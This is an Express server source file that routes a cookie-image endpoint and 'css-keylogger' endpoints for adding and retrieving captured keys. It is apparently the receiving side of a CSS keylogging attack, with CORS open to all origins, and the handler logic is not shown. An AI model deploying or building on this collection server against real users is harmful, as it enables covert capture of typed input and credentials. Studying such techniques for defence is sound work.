const express = require("express");
const cookieParser = require("cookie-parser");
var cors = require('cors')

const cookieImageHandler = require('./routes/cookie-image')
const cssKeyLoggerAddKeyHandler = require('./routes/css-keylogger/addKey')
const cssKeyLoggerGetKeysHandler = require('./routes/css-keylogger/getKeys')

const app = express();
app.use(cors())

app.use(cookieParser());
app.use('/static', express.static('public'))
const port = process.env.PORT || 8080;

app.get("/", (req, res) => {
  res.send("Use to get /image.png to get an image!");
});

app.get("/image.png", cookieImageHandler);
app.get("/css-keylogger/add-key", cssKeyLoggerAddKeyHandler);
app.get("/css-keylogger/keys", cssKeyLoggerGetKeysHandler);


app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
